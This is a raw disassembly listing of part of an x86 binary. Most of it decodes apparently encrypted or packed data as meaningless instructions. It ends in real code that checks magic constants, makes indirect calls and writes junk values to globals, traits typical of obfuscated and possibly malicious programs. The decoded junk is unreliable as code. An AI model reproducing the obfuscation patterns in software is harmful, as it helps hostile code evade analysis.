  41bb1d:	xchg   edi,eax
  41bb1e:	jge    0x41bb95
  41bb20:	lock cmp BYTE PTR [ecx+0x4e51ffe3],0xf
  41bb28:	bndstx [edi-0x2d14279a],(bad)
  41bb2f:	or     BYTE PTR [ecx-0x341f84d4],ch
  41bb35:	xchg   esi,eax
  41bb36:	inc    esi
  41bb37:	loop   0x41bb38
  41bb39:	icebp  
  41bb3a:	stos   BYTE PTR es:[edi],al
  41bb3b:	sar    BYTE PTR [edi],1
  41bb3d:	jle    0x41bba3
  41bb3f:	mov    bl,BYTE PTR [edi-0x1f]
  41bb42:	push   ebp
  41bb43:	jg     0x41bbbf
  41bb45:	and    eax,0x413ec403
  41bb4b:	sub    eax,0xea0c8ead
  41bb50:	pop    esp
  41bb51:	mov    ah,0x7c
  41bb53:	popf   
  41bb54:	mov    bl,0xbd
  41bb56:	mov    al,ds:0x94ff4be5
  41bb5b:	nop
  41bb5c:	cwde   
  41bb5d:	les    esi,FWORD PTR [ebx]
  41bb5f:	outs   dx,BYTE PTR ds:[esi]
  41bb60:	retf   0xf58b
  41bb63:	jg     0x41bb12
  41bb65:	mov    ds:0xfa09ea28,al
  41bb6a:	lock inc ebp
  41bb6c:	jmp    0x844f:0xada852f5
  41bb73:	pop    esi
  41bb74:	fisttp WORD PTR [edi-0x2435bc91]
  41bb7a:	neg    DWORD PTR [edx+0x5b]
  41bb7d:	out    dx,eax
  41bb7e:	jp     0x41bbc4
  41bb80:	push   cs
  41bb81:	(bad)  
  41bb82:	push   edx
  41bb83:	cli    
  41bb84:	call   0x3ff3:0x6d674bd7
  41bb8b:	addr16 test eax,0xcca868d0
  41bb91:	popa   
  41bb92:	fmul   QWORD PTR [ebp-0x5a]
  41bb95:	pop    edi
  41bb96:	ds xor dl,dh
  41bb99:	mov    dl,0x3e
  41bb9b:	dec    esp
  41bb9c:	jbe    0x41bb92
  41bb9e:	mov    eax,0xf758b061
  41bba3:	jmp    0xafdd3482
  41bba8:	dec    ebx
  41bba9:	out    0x3e,eax
  41bbab:	xor    al,bh
  41bbad:	pop    ebx
  41bbae:	mov    edx,0x12079d8a
  41bbb3:	pop    es
  41bbb4:	adc    dh,BYTE PTR [edx+0x10]
  41bbb7:	or     edx,eax
  41bbb9:	shl    dh,0x18
  41bbbc:	and    DWORD PTR [ebp-0x19],ecx
  41bbbf:	nop
  41bbc0:	sbb    DWORD PTR ss:[ecx-0x64c76759],ebp
  41bbc7:	(bad)  
  41bbc8:	addr16 out dx,al
  41bbca:	add    al,0xf4
  41bbcc:	cmp    BYTE PTR [esi+esi*1-0x2e],bh
  41bbd0:	adc    al,0xeb
  41bbd2:	pop    eax
  41bbd3:	lods   al,BYTE PTR ds:[esi]
  41bbd4:	cmp    al,0x5e
  41bbd6:	xlat   BYTE PTR ds:[ebx]
  41bbd7:	inc    ebx
  41bbd8:	mov    eax,0x66d22eda
  41bbdd:	pop    eax
  41bbde:	loopne 0x41bb89
  41bbe0:	stos   BYTE PTR es:[edi],al
  41bbe1:	dec    edi
  41bbe2:	inc    edx
  41bbe3:	lods   eax,DWORD PTR ds:[esi]
  41bbe4:	adc    ebx,DWORD PTR [esi+0x4a]
  41bbe7:	sub    al,0x8b
  41bbe9:	xchg   edx,eax
  41bbea:	popf   
  41bbeb:	fwait
  41bbec:	xchg   esp,eax
  41bbed:	sahf   
  41bbee:	sub    eax,0x53f31997
  41bbf3:	adc    BYTE PTR [ecx],ah
  41bbf5:	std    
  41bbf6:	push   cs
  41bbf7:	dec    esp
  41bbf8:	(bad)  
  41bbf9:	jmp    0xd327f790
  41bbfe:	loop   0x41bbaa
  41bc00:	outs   dx,DWORD PTR ds:[esi]
  41bc01:	or     dl,bh
  41bc03:	jmp    0x65e3a354
  41bc08:	sbb    al,0xf0
  41bc0a:	fadd   DWORD PTR [edx]
  41bc0c:	mov    bh,0x6b
  41bc0e:	stc    
  41bc0f:	sub    edi,DWORD PTR [eax]
  41bc11:	pusha  
  41bc12:	scas   eax,DWORD PTR es:[edi]
  41bc13:	div    DWORD PTR [edi+0x4a]
  41bc16:	push   esi
  41bc17:	jae    0x41bbbc
  41bc19:	lahf   
  41bc1a:	jmp    0x1567b695
  41bc1f:	sar    BYTE PTR [ebx+0x30e894eb],1
  41bc25:	into   
  41bc26:	push   cs
  41bc27:	mov    ch,0x4
  41bc29:	test   bh,ah
  41bc2b:	adc    dl,BYTE PTR [esp+ebx*8+0x5c1c7ba3]
  41bc32:	mov    esp,gs
  41bc34:	sti    
  41bc35:	ins    BYTE PTR es:[edi],dx
  41bc36:	call   DWORD PTR [ecx+0x2a]
  41bc39:	and    eax,eax
  41bc3b:	(bad)  
  41bc3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc3d:	das    
  41bc3e:	cmp    BYTE PTR [esp+ecx*8+0x18f05738],bh
  41bc45:	and    dl,dh
  41bc47:	jne    0x41bc56
  41bc49:	std    
  41bc4a:	fidivr DWORD PTR [ecx-0x106fcd42]
  41bc50:	mov    dh,0x6f
  41bc52:	or     DWORD PTR [eax-0x46],ecx
  41bc55:	loopne 0x41bcb0
  41bc57:	out    dx,al
  41bc58:	ficom  DWORD PTR [edx-0x64]
  41bc5b:	adc    DWORD PTR [edi],edx
  41bc5d:	xchg   edx,eax
  41bc5e:	or     eax,0x8d45a19a
  41bc63:	xchg   DWORD PTR [ecx+edi*1],ecx
  41bc66:	sbb    dh,BYTE PTR [eax]
  41bc68:	dec    esi
  41bc69:	push   ss
  41bc6a:	lahf   
  41bc6b:	rcl    BYTE PTR [ecx+0x10d67958],1
  41bc71:	nop
  41bc72:	cmp    DWORD PTR [edi],0x5cf1f09d
  41bc78:	(bad)  
  41bc79:	push   DWORD PTR [ecx]
  41bc7b:	add    ebp,edi
  41bc7d:	jmp    0x41bce3
  41bc7f:	lods   eax,DWORD PTR ds:[esi]
  41bc80:	shl    DWORD PTR [ecx-0x48],0x3c
  41bc84:	mov    ebx,0xc731d5be
  41bc89:	xchg   edi,eax
  41bc8a:	lock ins BYTE PTR es:[edi],dx
  41bc8c:	daa    
  41bc8d:	sub    edi,DWORD PTR [eax]
  41bc8f:	adc    DWORD PTR [ebp-0x221fa873],ebp
  41bc95:	or     ah,BYTE PTR ds:0xd0330393
  41bc9b:	adc    esp,esi
  41bc9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc9e:	cmc    
  41bc9f:	retf   
  41bca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bca1:	and    ecx,DWORD PTR [edi+0x120080aa]
  41bca7:	jbe    0x41bcf9
  41bca9:	retf   0xf2ce
  41bcac:	sahf   
  41bcad:	mov    al,ds:0x9d39ff4
  41bcb2:	(bad)  
  41bcb3:	mov    dl,0x5b
  41bcb5:	clc    
  41bcb6:	neg    BYTE PTR [eax+0x75512e34]
  41bcbc:	aam    0x4e
  41bcbe:	out    dx,al
  41bcbf:	aas    
  41bcc0:	sti    
  41bcc1:	fistp  QWORD PTR [edi-0xb]
  41bcc4:	inc    ebp
  41bcc5:	push   esi
  41bcc6:	mov    ebx,0xd9707d9b
  41bccb:	mov    ch,0x6c
  41bccd:	mov    ds:0xfd1fab70,al
  41bcd2:	inc    eax
  41bcd3:	(bad)  
  41bcd5:	into   
  41bcd6:	data16 rcr BYTE PTR [ebx],0xff
  41bcda:	mov    dl,0x6d
  41bcdc:	sbb    esp,eax
  41bcde:	stos   BYTE PTR es:[edi],al
  41bcdf:	mov    cl,0x8d
  41bce1:	btr    DWORD PTR [ecx],ecx
  41bce4:	shl    BYTE PTR [eax+ecx*2+0x20],cl
  41bce8:	daa    
  41bce9:	jnp    0x41bcde
  41bceb:	loop   0x41bcd1
  41bced:	icebp  
  41bcee:	daa    
  41bcef:	ja     0x41bcbd
  41bcf1:	imul   esp,edx,0x3
  41bcf4:	push   esp
  41bcf5:	pop    ss
  41bcf6:	icebp  
  41bcf7:	pushf  
  41bcf8:	mov    bl,0x8d
  41bcfa:	push   edx
  41bcfb:	(bad)  
  41bcfc:	fcmovbe st,st(0)
  41bcfe:	ret    0x34d5
  41bd01:	aad    0xd6
  41bd03:	mov    cl,BYTE PTR [esi-0x49]
  41bd06:	fbstp  TBYTE PTR [edi]
  41bd08:	fcmovnu st,st(0)
  41bd0a:	in     al,0x3f
  41bd0c:	lods   al,BYTE PTR ds:[esi]
  41bd0d:	retf   0x8a62
  41bd10:	jo     0x41bc98
  41bd12:	scas   al,BYTE PTR es:[edi]
  41bd13:	adc    esp,DWORD PTR [esi+0x4]
  41bd16:	lods   eax,DWORD PTR ds:[esi]
  41bd17:	ins    BYTE PTR es:[edi],dx
  41bd18:	sub    BYTE PTR [ebx],0x1b
  41bd1b:	dec    ebx
  41bd1c:	inc    edi
  41bd1d:	jle    0x41bcca
  41bd1f:	push   0x306b845f
  41bd24:	test   al,0x8e
  41bd26:	mov    dl,0x4a
  41bd28:	scas   al,BYTE PTR es:[edi]
  41bd29:	push   esp
  41bd2a:	aad    0x79
  41bd2c:	pop    ebp
  41bd2d:	ins    BYTE PTR es:[edi],dx
  41bd2e:	ins    DWORD PTR es:[edi],dx
  41bd2f:	mov    ebp,0x2a9b197
  41bd34:	jo     0x41bce8
  41bd36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd37:	jg     0x41bd29
  41bd39:	add    DWORD PTR [eax-0x2daf8359],ecx
  41bd3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd40:	jge    0x41bd7a
  41bd42:	inc    esp
  41bd43:	dec    esp
  41bd44:	aas    
  41bd45:	xor    bh,ah
  41bd47:	shl    DWORD PTR [esi],cl
  41bd49:	neg    BYTE PTR [edx+edi*1+0x4faf5558]
  41bd50:	add    esp,DWORD PTR [edi+0x6053bbf5]
  41bd56:	cs in  eax,dx
  41bd58:	std    
  41bd59:	les    edi,FWORD PTR [edi]
  41bd5b:	inc    eax
  41bd5c:	js     0x41bce3
  41bd5e:	pushf  
  41bd5f:	xor    edx,ebp
  41bd61:	xor    dh,ch
  41bd63:	jge    0x41bd42
  41bd65:	pop    esi
  41bd66:	mov    ebx,?
  41bd68:	inc    si
  41bd6a:	iret   
  41bd6b:	in     eax,0x59
  41bd6d:	push   esp
  41bd6e:	push   esi
  41bd6f:	enter  0xfec0,0x74
  41bd73:	mov    edx,0x291acd5f
  41bd78:	popa   
  41bd79:	loope  0x41bdf5
  41bd7b:	xor    eax,0xfa6b182b
  41bd80:	out    0x62,al
  41bd82:	jge    0x41bda0
  41bd84:	imul   ecx,edi,0x4b1cebe4
  41bd8a:	idiv   BYTE PTR [eax+0xf]
  41bd8d:	jp     0x41bd49
  41bd8f:	xchg   ebx,eax
  41bd90:	pop    ss
  41bd91:	or     BYTE PTR [esi],dl
  41bd93:	inc    eax
  41bd94:	or     edx,DWORD PTR [ecx]
  41bd96:	xor    eax,0xf13a2387
  41bd9b:	data16 mov ds:0xbba88142,al
  41bda1:	pop    eax
  41bda2:	sti    
  41bda3:	pop    ebp
  41bda4:	push   ecx
  41bda5:	loope  0x41bd62
  41bda7:	push   0xffffff8c
  41bda9:	xlat   BYTE PTR ds:[ebx]
  41bdaa:	push   ecx
  41bdab:	(bad)  
  41bdac:	cs out 0x2b,al
  41bdaf:	out    dx,al
  41bdb0:	xchg   esi,eax
  41bdb1:	cwde   
  41bdb2:	cwde   
  41bdb3:	or     eax,0xf84b9142
  41bdb8:	dec    edx
  41bdb9:	push   ecx
  41bdba:	into   
  41bdbb:	gs push 0xffffffda
  41bdbe:	cli    
  41bdbf:	and    eax,0xb66ab199
  41bdc4:	and    eax,0xed1b9b4c
  41bdc9:	sub    eax,DWORD PTR [edi]
  41bdcb:	loop   0x41be4b
  41bdcd:	fwait
  41bdce:	add    al,bh
  41bdd0:	mov    edi,0x1a1b0996
  41bdd5:	cmp    DWORD PTR [edi+0x68da3d31],edi
  41bddb:	fnsave [ecx*8-0x44a3635e]
  41bde2:	rcr    DWORD PTR [edi-0x5a],0x1f
  41bde6:	(bad)  
  41bde7:	neg    BYTE PTR [ecx+0x22]
  41bdea:	mov    dl,BYTE PTR [ebp-0xa]
  41bded:	dec    edi
  41bdee:	xlat   BYTE PTR ds:[ebx]
  41bdef:	retf   
  41bdf0:	cli    
  41bdf1:	clc    
  41bdf2:	test   eax,0xcd7d31df
  41bdf7:	es std 
  41bdf9:	xchg   ebp,eax
  41bdfa:	add    al,0xc0
  41bdfc:	enter  0x5e94,0x71
  41be00:	jnp    0x41bdf0
  41be02:	call   0x256c61cc
  41be07:	bound  edi,QWORD PTR [ebx+0x14]
  41be0a:	in     eax,0x62
  41be0c:	pop    ecx
  41be0d:	jbe    0x41bdf0
  41be0f:	call   0x3285f4c6
  41be14:	mov    ds:0x2c259b34,eax
  41be19:	xor    cl,ch
  41be1b:	add    eax,0x5ec2c11f
  41be20:	shr    BYTE PTR [ebx+0x1ff75a08],0xd9
  41be27:	pop    ecx
  41be28:	js     0x41bdf2
  41be2a:	mov    ah,0xc6
  41be2c:	cs push ds
  41be2e:	jno    0x41bdcf
  41be30:	cmp    al,0xd8
  41be32:	or     eax,0x745f5765
  41be37:	sbb    DWORD PTR [edi-0x16],edx
  41be3a:	dec    ecx
  41be3b:	inc    edi
  41be3c:	sbb    eax,0x92e16abc
  41be41:	xchg   esp,eax
  41be42:	xchg   ecx,eax
  41be43:	fisub  WORD PTR [ebx-0xebbf0d8]
  41be49:	mov    bl,BYTE PTR [edx-0x4e73db8b]
  41be4f:	pop    esi
  41be50:	inc    esp
  41be51:	loope  0x41bdec
  41be53:	popa   
  41be54:	adc    dh,BYTE PTR [ecx*1+0x5d26d9b5]
  41be5b:	adc    eax,0x5fac7973
  41be60:	add    BYTE PTR [edx],dh
  41be62:	dec    esi
  41be63:	fdiv   QWORD PTR [ecx]
  41be65:	popa   
  41be66:	dec    ebp
  41be67:	push   ecx
  41be68:	lea    esi,[eax+0xa7c97e6]
  41be6e:	stc    
  41be6f:	sbb    BYTE PTR [esi],dh
  41be71:	icebp  
  41be72:	mov    ebx,0x1d309aa8
  41be77:	popa   
  41be78:	push   ss
  41be79:	mov    dl,0x26
  41be7b:	push   eax
  41be7c:	lods   al,BYTE PTR ds:[esi]
  41be7d:	shr    dh,1
  41be7f:	pop    es
  41be80:	and    al,0xc5
  41be82:	aad    0xe7
  41be84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be85:	mov    ebx,0xbbc8fb98
  41be8a:	call   0x512a3e71
  41be8f:	je     0x41be46
  41be91:	retf   0x8c42
  41be94:	scas   eax,DWORD PTR es:[edi]
  41be95:	lods   al,BYTE PTR ds:[esi]
  41be96:	bound  ebp,QWORD PTR [edi]
  41be98:	jmp    0x940a37c5
  41be9d:	jmp    0x41bf03
  41be9f:	or     al,0x31
  41bea1:	nop
  41bea2:	lea    ecx,[edx*8+0x2f744b87]
  41bea9:	jecxz  0x41bed6
  41beab:	pop    esi
  41beac:	shl    DWORD PTR [ebp+0x4709a3e7],0x0
  41beb3:	out    dx,al
  41beb4:	in     al,0x6d
  41beb6:	lods   eax,DWORD PTR ds:[esi]
  41beb7:	(bad)  
  41beb8:	nop
  41beb9:	push   edi
  41beba:	loop   0x41bee1
  41bebc:	shr    DWORD PTR [esi+0x0],1
  41bebf:	outs   dx,BYTE PTR ds:[esi]
  41bec0:	adc    al,0xa3
  41bec2:	stos   DWORD PTR es:[edi],eax
  41bec3:	mov    ah,0x5c
  41bec5:	stos   BYTE PTR es:[edi],al
  41bec6:	mov    dh,0x34
  41bec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bec9:	je     0x41bf28
  41becb:	xor    dl,0xeb
  41bece:	xchg   ecx,eax
  41becf:	out    dx,eax
  41bed0:	js     0x41bf29
  41bed2:	(bad)  
  41bed3:	fldenv [edi]
  41bed5:	xlat   BYTE PTR ds:[ebx]
  41bed6:	xchg   BYTE PTR [ebp+0x61],dh
  41bed9:	and    eax,0x2e836d44
  41bede:	lods   eax,DWORD PTR ds:[esi]
  41bedf:	push   0x3e432ca3
  41bee4:	sub    eax,0xc7ed3deb
  41bee9:	rcr    ebx,0xca
  41beec:	xor    DWORD PTR [eax+ecx*2-0x51],edx
  41bef0:	fistp  WORD PTR [ebx+eiz*4+0x43b06776]
  41bef7:	arpl   WORD PTR [esi-0x766d002d],bx
  41befd:	sbb    BYTE PTR [ebp+0x32],dh
  41bf00:	adc    ebp,0xe5a4fc44
  41bf06:	gs push 0x329743e0
  41bf0c:	out    0x7e,eax
  41bf0e:	inc    ecx
  41bf0f:	jge    0x41bed6
  41bf11:	pushf  
  41bf12:	jp     0x41bea6
  41bf14:	or     al,0x3d
  41bf16:	inc    eax
  41bf17:	cs nop esp
  41bf1b:	js     0x41bee6
  41bf1d:	xchg   ebp,eax
  41bf1e:	xchg   ebx,eax
  41bf1f:	push   0x63f00162
  41bf24:	fnstcw WORD PTR [edx-0x26756504]
  41bf2a:	ins    BYTE PTR es:[edi],dx
  41bf2b:	dec    BYTE PTR [ecx+0x2ed9dbc2]
  41bf31:	sub    esp,DWORD PTR [esi-0x1f78d576]
  41bf37:	dec    ebx
  41bf38:	add    BYTE PTR [ebx],ah
  41bf3a:	gs jp  0x41bec5
  41bf3d:	mov    bl,0x8d
  41bf3f:	push   edx
  41bf40:	ror    BYTE PTR [edi+0x5a],cl
  41bf43:	adc    cl,bl
  41bf45:	outs   dx,BYTE PTR ds:[esi]
  41bf46:	push   0xee9f387e
  41bf4b:	lea    esi,[eax+esi*4]
  41bf4e:	push   eax
  41bf4f:	adc    eax,0xb848cdb2
  41bf54:	adc    DWORD PTR [ecx-0x7b],0x607ad5ab
  41bf5b:	mov    WORD PTR [edx-0x68],cs
  41bf5e:	adc    al,0x8b
  41bf60:	inc    ebp
  41bf61:	sahf   
  41bf62:	mov    ebx,0xc08384b
  41bf67:	xchg   DWORD PTR [ebp+0x3df2a778],edx
  41bf6d:	add    al,0x3b
  41bf6f:	and    al,0x23
  41bf71:	enter  0x2d52,0x27
  41bf75:	xchg   ebx,eax
  41bf76:	push   eax
  41bf77:	rcl    ebp,1
  41bf79:	jmp    0x1f4da337
  41bf7e:	loop   0x41bf58
  41bf80:	xor    ebx,DWORD PTR gs:[edi+0x3ed6c457]
  41bf87:	or     al,0x4d
  41bf89:	sub    al,0x8b
  41bf8b:	mov    eax,DWORD PTR [edi]
  41bf8d:	push   ds
  41bf8e:	adc    al,0x19
  41bf90:	add    eax,0x11249e0c
  41bf95:	stos   BYTE PTR es:[edi],al
  41bf96:	in     al,0x3b
  41bf98:	les    ebp,FWORD PTR [edx+0x79eefceb]
  41bf9e:	dec    edi
  41bf9f:	sub    DWORD PTR [esi-0x2ceba134],edi
  41bfa5:	push   ebx
  41bfa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfa7:	ja     0x41c019
  41bfa9:	stc    
  41bfaa:	daa    
  41bfab:	xor    BYTE PTR [ecx],ch
  41bfad:	enter  0xed88,0x11
  41bfb1:	cld    
  41bfb2:	inc    edi
  41bfb3:	xlat   BYTE PTR ds:[ebx]
  41bfb4:	jns    0x41bfe4
  41bfb6:	scas   eax,DWORD PTR es:[edi]
  41bfb7:	or     bh,BYTE PTR [edx-0x65b75183]
  41bfbd:	sbb    eax,0xe597d906
  41bfc2:	jmp    0x54a8:0x75ddb7f9
  41bfc9:	shr    DWORD PTR [edx],1
  41bfcb:	xchg   ecx,eax
  41bfcc:	cwde   
  41bfcd:	mov    bl,0x87
  41bfcf:	jne    0x41bf56
  41bfd1:	pop    edx
  41bfd2:	out    dx,eax
  41bfd3:	add    ebp,edi
  41bfd5:	les    ebx,FWORD PTR [edi]
  41bfd7:	mov    edi,DWORD PTR [eax]
  41bfd9:	and    eax,0x5df6adcb
  41bfde:	xlat   BYTE PTR ds:[ebx]
  41bfdf:	adc    edx,DWORD PTR [ebp+0x34246cd6]
  41bfe5:	(bad)  
  41bfe6:	xchg   esi,eax
  41bfe7:	mov    ebp,0xca9580e
  41bfec:	push   esi
  41bfed:	rol    BYTE PTR [ebx],0xd5
  41bff0:	sbb    esi,0xe2efaa1f
  41bff6:	(bad)  
  41bff7:	(bad)  
  41bff8:	mov    al,ds:0xe7528c84
  41bffd:	test   eax,0x971a3f17
  41c002:	mov    eax,0xac17dfb1
  41c007:	fwait
  41c008:	ins    BYTE PTR es:[edi],dx
  41c009:	sbb    dl,BYTE PTR [ebp+0x49]
  41c00c:	xor    ecx,ecx
  41c00e:	pusha  
  41c00f:	push   0x4c
  41c011:	fcom   QWORD PTR [edi-0x6c59ca1a]
  41c017:	cli    
  41c018:	fs jp  0x41c03a
  41c01b:	jp     0x41c01e
  41c01d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c01e:	repnz or dh,dl
  41c021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c022:	inc    esp
  41c023:	dec    edx
  41c024:	pushf  
  41c025:	sbb    esi,DWORD PTR [edi]
  41c027:	mov    ds:0x57df1c12,eax
  41c02c:	ja     0x41bff8
  41c02e:	enter  0x41ea,0x6e
  41c032:	ret    
  41c033:	sbb    BYTE PTR [ebx+edx*2],dh
  41c036:	sub    edx,DWORD PTR [eax-0x256a553c]
  41c03c:	ret    0x93f0
  41c03f:	loope  0x41c066
  41c041:	lock mov ds:0x6dc2e6d1,al
  41c047:	mov    ebp,?
  41c049:	iret   
  41c04a:	adc    DWORD PTR [edi+0xad4fc2d],ecx
  41c050:	je     0x41c0a8
  41c052:	cdq    
  41c053:	mov    cl,0x3e
  41c055:	cld    
  41c056:	inc    ebp
  41c057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c058:	data16 (bad) 
  41c05a:	stc    
  41c05b:	add    DWORD PTR [ecx-0x775a44d0],0x1e
  41c062:	es sbb eax,0xc4aabe50
  41c068:	dec    edi
  41c069:	pop    es
  41c06a:	stos   BYTE PTR es:[edi],al
  41c06b:	fsub   DWORD PTR [ebp+0x4a3d6b57]
  41c071:	pop    eax
  41c072:	xor    esp,DWORD PTR [esi+0x54011f16]
  41c078:	pop    ebx
  41c079:	stc    
  41c07a:	das    
  41c07b:	cmp    ebp,DWORD PTR [edx+0x72]
  41c07e:	xchg   DWORD PTR [ebx-0x1d],esi
  41c081:	aaa    
  41c082:	mov    ebx,0xfcb94a54
  41c087:	idiv   eax
  41c089:	or     ebp,DWORD PTR [edx-0x343ad938]
  41c08f:	jne    0x41c0ea
  41c091:	(bad)  
  41c092:	aam    0xd
  41c094:	mov    edi,0x9643fad1
  41c099:	cmp    bl,BYTE PTR [ebx-0x23]
  41c09c:	cdq    
  41c09d:	or     eax,0x994f927e
  41c0a2:	pop    ebp
  41c0a3:	mov    ecx,DWORD PTR [ebp+0x26]
  41c0a6:	pusha  
  41c0a7:	outs   dx,DWORD PTR ds:[esi]
  41c0a8:	xor    DWORD PTR [edi+ebx*8-0x4e167ac4],ebp
  41c0af:	sub    eax,DWORD PTR [edx]
  41c0b1:	mov    bl,ah
  41c0b3:	pop    es
  41c0b4:	pop    esi
  41c0b5:	aam    0x19
  41c0b7:	cs (bad) 
  41c0ba:	ss jmp 0xa637ce02
  41c0c0:	cmp    ah,BYTE PTR [eax+0x4b]
  41c0c3:	into   
  41c0c4:	jo     0x41c06d
  41c0c6:	test   al,0xdd
  41c0c8:	or     al,0x59
  41c0ca:	xchg   esi,eax
  41c0cb:	xchg   ebx,eax
  41c0cc:	imul   DWORD PTR [esi]
  41c0ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0cf:	into   
  41c0d0:	cmp    ah,cl
  41c0d2:	int3   
  41c0d3:	add    BYTE PTR [edi+0x42ea21f7],dh
  41c0d9:	jecxz  0x41c133
  41c0db:	mov    ch,0x98
  41c0dd:	inc    ecx
  41c0de:	out    0x6d,eax
  41c0e0:	cdq    
  41c0e1:	and    BYTE PTR [edx],ch
  41c0e3:	gs (bad) 
  41c0e5:	jns    0x41c067
  41c0e7:	mov    ebx,0x5d8ef5ef
  41c0ec:	repnz xchg edx,esi
  41c0ef:	ficom  WORD PTR [esi+0x32]
  41c0f2:	stos   DWORD PTR es:[edi],eax
  41c0f3:	cwde   
  41c0f4:	fs xchg BYTE PTR es:[ecx],bl
  41c0f8:	add    eax,0xff505180
  41c0fd:	ror    BYTE PTR [ebx-0x5fc17b3],1
  41c103:	cmp    ecx,edi
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x430a50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x430a34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x430a18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428cf5
